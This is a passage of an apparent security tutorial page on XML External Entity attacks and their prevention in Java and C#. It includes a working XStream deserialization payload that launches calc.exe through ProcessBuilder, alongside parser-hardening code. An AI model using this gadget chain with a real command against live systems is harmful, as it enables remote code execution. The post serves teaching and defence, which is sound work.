+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5"> 5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6"> 6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7"> 7</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="8"><a style="outline: none; text-decoration:none; color:inherit" href="#8"> 8</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="9"><a style="outline: none; text-decoration:none; color:inherit" href="#9"> 9</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="10"><a style="outline: none; text-decoration:none; color:inherit" href="#10">10</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="11"><a style="outline: none; text-decoration:none; color:inherit" href="#11">11</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="12"><a style="outline: none; text-decoration:none; color:inherit" href="#12">12</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="13"><a style="outline: none; text-decoration:none; color:inherit" href="#13">13</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="14"><a style="outline: none; text-decoration:none; color:inherit" href="#14">14</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="15"><a style="outline: none; text-decoration:none; color:inherit" href="#15">15</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="16"><a style="outline: none; text-decoration:none; color:inherit" href="#16">16</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="17"><a style="outline: none; text-decoration:none; color:inherit" href="#17">17</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="18"><a style="outline: none; text-decoration:none; color:inherit" href="#18">18</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="19"><a style="outline: none; text-decoration:none; color:inherit" href="#19">19</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="20"><a style="outline: none; text-decoration:none; color:inherit" href="#20">20</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="21"><a style="outline: none; text-decoration:none; color:inherit" href="#21">21</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="22"><a style="outline: none; text-decoration:none; color:inherit" href="#22">22</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="23"><a style="outline: none; text-decoration:none; color:inherit" href="#23">23</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="24"><a style="outline: none; text-decoration:none; color:inherit" href="#24">24</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="25"><a style="outline: none; text-decoration:none; color:inherit" href="#25">25</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="26"><a style="outline: none; text-decoration:none; color:inherit" href="#26">26</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="27"><a style="outline: none; text-decoration:none; color:inherit" href="#27">27</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="28"><a style="outline: none; text-decoration:none; color:inherit" href="#28">28</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="29"><a style="outline: none; text-decoration:none; color:inherit" href="#29">29</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#204a87;font-weight:bold">package</span> <span style="color:#000">com.securitywhitepapers.xxe</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">javax.xml.stream.XMLStreamException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">public</span> <span style="color:#204a87;font-weight:bold">class</span> <span style="color:#000">XStream</span> <span style="color:#ce5c00;font-weight:bold">{</span>
+
+    <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#204a87;font-weight:bold">static</span> <span style="color:#204a87;font-weight:bold">void</span> <span style="color:#000">main</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">String</span><span style="color:#ce5c00;font-weight:bold">[]</span> <span style="color:#000">args</span><span style="color:#ce5c00;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">throws</span> <span style="color:#000">XMLStreamException</span> <span style="color:#ce5c00;font-weight:bold">{</span>
+        
+        <span style="color:#000">com</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">thoughtworks</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">xstream</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">XStream</span> <span style="color:#000">xstream</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">com</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">thoughtworks</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">xstream</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">XStream</span><span style="color:#ce5c00;font-weight:bold">();</span>
+        
+        <span style="color:#8f5902;font-style:italic">//payload to open calc.exe
+</span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">String</span> <span style="color:#000">payload</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#4e9a06">&#34;&lt;sorted-set&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;string&gt;foo&lt;/string&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;dynamic-proxy&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;handler class=\&#34;java.beans.EventHandler\&#34;&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34; &lt;target class=\&#34;java.lang.ProcessBuilder\&#34;&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34; &lt;command&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34; &lt;string&gt;calc.exe&lt;/string&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34; &lt;/command&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34; &lt;/target&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34; &lt;action&gt;start&lt;/action&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;/handler&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;/dynamic-proxy&gt;&#34;</span> <span style="color:#ce5c00;font-weight:bold">+</span>
+                <span style="color:#4e9a06">&#34;&lt;/sorted-set&gt;&#34;</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+        <span style="color:#000">Contact</span> <span style="color:#000">expl</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">Contact</span><span style="color:#ce5c00;font-weight:bold">)</span> <span style="color:#000">xstream</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">fromXML</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">payload</span><span style="color:#ce5c00;font-weight:bold">);</span>
+    <span style="color:#ce5c00;font-weight:bold">}</span>
+<span style="color:#ce5c00;font-weight:bold">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And if you run it, you will see a calculator opening. To prevent this you either update XStream to a new version which is the best approach, or you can see a workaround in the official <a href="https://x-stream.github.io/CVE-2013-7285.html#workaround">documentation</a></p>
+<p>And now how can you fix XXE for the other parsers?</p>
+<h3 id="preventing-external-entities-attacks">Preventing External Entities attacks</h3>
+<p>To prevent this vulnerability we need to disable entities. This is the <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md">recommendation from OWASP</a>:</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1"> 1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2"> 2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3"> 3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4"> 4</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5"> 5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6"> 6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7"> 7</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="8"><a style="outline: none; text-decoration:none; color:inherit" href="#8"> 8</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="9"><a style="outline: none; text-decoration:none; color:inherit" href="#9"> 9</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="10"><a style="outline: none; text-decoration:none; color:inherit" href="#10">10</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="11"><a style="outline: none; text-decoration:none; color:inherit" href="#11">11</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="12"><a style="outline: none; text-decoration:none; color:inherit" href="#12">12</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="13"><a style="outline: none; text-decoration:none; color:inherit" href="#13">13</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="14"><a style="outline: none; text-decoration:none; color:inherit" href="#14">14</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="15"><a style="outline: none; text-decoration:none; color:inherit" href="#15">15</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="16"><a style="outline: none; text-decoration:none; color:inherit" href="#16">16</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="17"><a style="outline: none; text-decoration:none; color:inherit" href="#17">17</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="18"><a style="outline: none; text-decoration:none; color:inherit" href="#18">18</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="19"><a style="outline: none; text-decoration:none; color:inherit" href="#19">19</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="20"><a style="outline: none; text-decoration:none; color:inherit" href="#20">20</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="21"><a style="outline: none; text-decoration:none; color:inherit" href="#21">21</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="22"><a style="outline: none; text-decoration:none; color:inherit" href="#22">22</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="23"><a style="outline: none; text-decoration:none; color:inherit" href="#23">23</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="24"><a style="outline: none; text-decoration:none; color:inherit" href="#24">24</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="25"><a style="outline: none; text-decoration:none; color:inherit" href="#25">25</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="26"><a style="outline: none; text-decoration:none; color:inherit" href="#26">26</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#204a87;font-weight:bold">package</span> <span style="color:#000">com.securitywhitepapers.xxe</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">java.io.File</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">java.io.IOException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.dom4j.Document</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.dom4j.DocumentException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.dom4j.io.SAXReader</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.jdom2.JDOMException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.xml.sax.SAXException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">public</span> <span style="color:#204a87;font-weight:bold">class</span> <span style="color:#000">SaxReader</span> <span style="color:#ce5c00;font-weight:bold">{</span>
+
+    <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#204a87;font-weight:bold">static</span> <span style="color:#204a87;font-weight:bold">void</span> <span style="color:#000">main</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">String</span><span style="color:#ce5c00;font-weight:bold">[]</span> <span style="color:#000">args</span><span style="color:#ce5c00;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">throws</span> <span style="color:#000">IOException</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#000">JDOMException</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#000">DocumentException</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#000">SAXException</span> <span style="color:#ce5c00;font-weight:bold">{</span>
+       
+        <span style="color:#000">SAXReader</span> <span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">SAXReader</span><span style="color:#ce5c00;font-weight:bold">();</span>
+        
+        <span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">setFeature</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#4e9a06">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">true</span><span style="color:#ce5c00;font-weight:bold">);</span>
+        <span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">setFeature</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#4e9a06">&#34;http://xml.org/sax/features/external-general-entities&#34;</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">false</span><span style="color:#ce5c00;font-weight:bold">);</span>
+        <span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">setFeature</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#4e9a06">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">false</span><span style="color:#ce5c00;font-weight:bold">);</span>
+        <span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">setFeature</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#4e9a06">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">false</span><span style="color:#ce5c00;font-weight:bold">);</span>
+        
+        <span style="color:#000">Document</span> <span style="color:#000">doc</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#204a87;font-weight:bold">null</span><span style="color:#ce5c00;font-weight:bold">;</span>
+        <span style="color:#000">doc</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">read</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">File</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#4e9a06">&#34;payload.xml&#34;</span><span style="color:#ce5c00;font-weight:bold">));</span>
+        <span style="color:#000">System</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">out</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">println</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">doc</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">asXML</span><span style="color:#ce5c00;font-weight:bold">());</span>
+    <span style="color:#ce5c00;font-weight:bold">}</span>
+<span style="color:#ce5c00;font-weight:bold">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Have in mind that there are multiple parsers for xml in java, each one has its way of parsing files, and its way to prevent it.<br>
+You can find at the end of the article a project&rsquo;s source project <strong>with</strong> multiple parsers, and how to prevent them.</p>
+<p>Unmarshaller from java 8 and above is secure by default.</p>
+<h3 id="for-c">For C#</h3>
+<p>.Net framework disabled the external entities by default in version 4.5.2 so this examples only work with versions bellow.</p>
+<p>To fix this issue in XMLDocument you just need to set the XML Resolver to null:</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1"> 1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2"> 2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3"> 3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4"> 4</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5"> 5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6"> 6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7"> 7</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="8"><a style="outline: none; text-decoration:none; color:inherit" href="#8"> 8</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="9"><a style="outline: none; text-decoration:none; color:inherit" href="#9"> 9</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="10"><a style="outline: none; text-decoration:none; color:inherit" href="#10">10</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="11"><a style="outline: none; text-decoration:none; color:inherit" href="#11">11</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="12"><a style="outline: none; text-decoration:none; color:inherit" href="#12">12</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="13"><a style="outline: none; text-decoration:none; color:inherit" href="#13">13</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="14"><a style="outline: none; text-decoration:none; color:inherit" href="#14">14</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="15"><a style="outline: none; text-decoration:none; color:inherit" href="#15">15</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="16"><a style="outline: none; text-decoration:none; color:inherit" href="#16">16</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="17"><a style="outline: none; text-decoration:none; color:inherit" href="#17">17</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#204a87;font-weight:bold">using</span> <span style="color:#000">System</span><span style="color:#000;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">using</span> <span style="color:#000">System.IO</span><span style="color:#000;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">using</span> <span style="color:#000">System.Xml</span><span style="color:#000;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">namespace</span> <span style="color:#000">XXEPOC</span>
+<span style="color:#000;font-weight:bold">{</span>
+    <span style="color:#204a87;font-weight:bold">class</span> <span style="color:#000">Program</span>
+    <span style="color:#000;font-weight:bold">{</span>
+        <span style="color:#204a87;font-weight:bold">static</span> <span style="color:#204a87;font-weight:bold">void</span> <span style="color:#000">Main</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">string</span><span style="color:#000;font-weight:bold">[]</span> <span style="color:#000">args</span><span style="color:#000;font-weight:bold">)</span>
+        <span style="color:#000;font-weight:bold">{</span>
+            <span style="color:#000">XmlDocument</span> <span style="color:#000">xmlDoc</span> <span style="color:#000;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">XmlDocument</span><span style="color:#000;font-weight:bold">();</span>
+            <span style="color:#000">String</span> <span style="color:#000">xmlContent</span> <span style="color:#000;font-weight:bold">=</span> <span style="color:#000">File</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">ReadAllText</span><span style="color:#000;font-weight:bold">(</span><span style="color:#4e9a06">&#34;payload.xml&#34;</span><span style="color:#000;font-weight:bold">);</span>
+            <span style="color:#000">xmlDoc</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">XmlResolver</span> <span style="color:#000;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">null</span><span style="color:#000;font-weight:bold">;</span>
+            <span style="color:#000">xmlDoc</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">LoadXml</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">xmlContent</span><span style="color:#000;font-weight:bold">);</span>
+        <span style="color:#000;font-weight:bold">}</span>
+    <span style="color:#000;font-weight:bold">}</span>
+<span style="color:#000;font-weight:bold">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="test-it-yourself"><strong>Test it yourself</strong></h3>
+<p>You can get the source code of the project used for this article, with tests for multiple java parsers <a href="https://github.com/TheSecurityVault/xxe">here</a>.</p>
+<p>Also I have an opensource tool called <a href="https://luisfontes19.github.io/xxexploiter/">XXExploiter</a> that you can use to generate the malicious payloads.</p>
+
+
+          
+        </div>
+      </div>
+
+      <div class="challange1">
+        <div class="d-none  d-sm-none d-md-block">
+          ClZHaGxVMlZqZFhKcGRIbFdZWFZzZEVobGNrWnZjbGx2ZFZSb1pWTmxZM1ZwZEhsV1lYVnNkRWhsY21WR2IzSlpiM1ZVYUdWVFkzVnlhWFI1Vm1GMWJIUklaWEpsUm05eVdXOTFWR2hsVTJWamRYSnBkSGxXWVhWc2RFaGxaVVp2Y2xsdmRWUm9aVk5qZFhKcGRIbFdZWFZzZEVobGNtVkdiM0paYjNWVWFGTmxZM1Z5YVhSNVZtRjFiSFJJWlhKbFJtOXlXVzkxVkdobFUyVmpkWEpwZEhsV1lYVnNkRWhsY21WdmNsbHZkVlJvWlZObFkzVnlhWFI1Vm1GMWJIUkljbVZHYjNKWmIzVlVhR1ZUWldOMWNuUjVWbUYxYkhSSVpYSmxSbTl5V1c5MVZHaGxVMlZqZFhKcGRIbFdZWFZzZEVobGNrWnZjbGx2ZFZSb1pWTmxZM1Z5YVhSNVZtRjFiSFJJWlhKbFJtOXlXWFZVYUdWVFpXTjFjbWwwZVZaaGRXeDBTR1Z5WlVaeVdXOTFhR1ZUWldOMWNtbDBlVlpoZFd4MFNHVnlaVVp2Y2xsdmRWUm9aVk5sWTNWeWFYUjVWbUYxYkhSSVpYSmxiM0paYjNWVWFHVlRaV04xY21sMGVXRjFiSFJJWlhKbFJtOXlXVzkxVkdobFUyVmpkWEpwZEhsV1lYVnNkRWhsY2tadmNsbHZkUT09
+        </div>
+      </div>
+    </section>
+
+
+
+  </div>
+
+  <div class="single-post-pagination">
+    <div class="row post-pagination">
+      <div class="col-md-6 previous-post">
+        
+        <a href="https://thesecurityvault.github.io/website/heap-inspection/">&lArr; Previous Post<br><b>Heap Inspection</b></a>
+        
+      </div>
+      <div class="col-md-6 next-post">
+        
+        <a href="https://thesecurityvault.github.io/website/weak-random/"> Next Post &rArr;<br><b>Weak Random</b></a>
+        
+      </div>
+    </div>
+  </div>
+</div><footer class="text-center footer">
+
+  <div class="container footer-content">
+    <div class="row">
+
+      <div class="col-md-6 text-left">
+        <div><img src="https://thesecurityvault.github.io/website/img/logo.png"></div>
+      </div>
+
+      <div class="col-md-6 text-right">
+        <div>
+          <a href="/sitemap.xml">Sitemap</a> |
+          <a href="/privacy-policy">Privacy Policy</a> |
+          <a href="/terms">Terms of Use</a>
+        </div>
+        <div>
+          Copyright 2019-2022 The Security Vault. All rights reserved.
+        </div>
+      </div>
+    </div>
+
+</footer>
+
+
+<script src="https://thesecurityvault.github.io/website/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="https://kit.fontawesome.com/ab4860f980.js" id="Fontawesome-js"></script>
+
+<script>
+
+  
+  const links = document.getElementsByTagName("a")
+  for (let i = 0; i < links.length; i++) {
+    const link = links[i]
+    link.addEventListener("click", (evt) => {
+      const a = evt.currentTarget
+      const isImage = a.href.endsWith(".jpg") || a.href.endsWith(".png") || a.href.endsWith(".jpeg") || a.href.endsWith(".gif")
+      const external = a.href.startsWith("http" && !a.href.startsWith(window.location.origin))
+
+      if (isImage || external) {
+        evt.currentTarget.target = "_blank"
+        evt.currentTarget.rel = "noopener noreferrer"
+      }
+    })
+  }
+
+</script></body>
+
+</html>
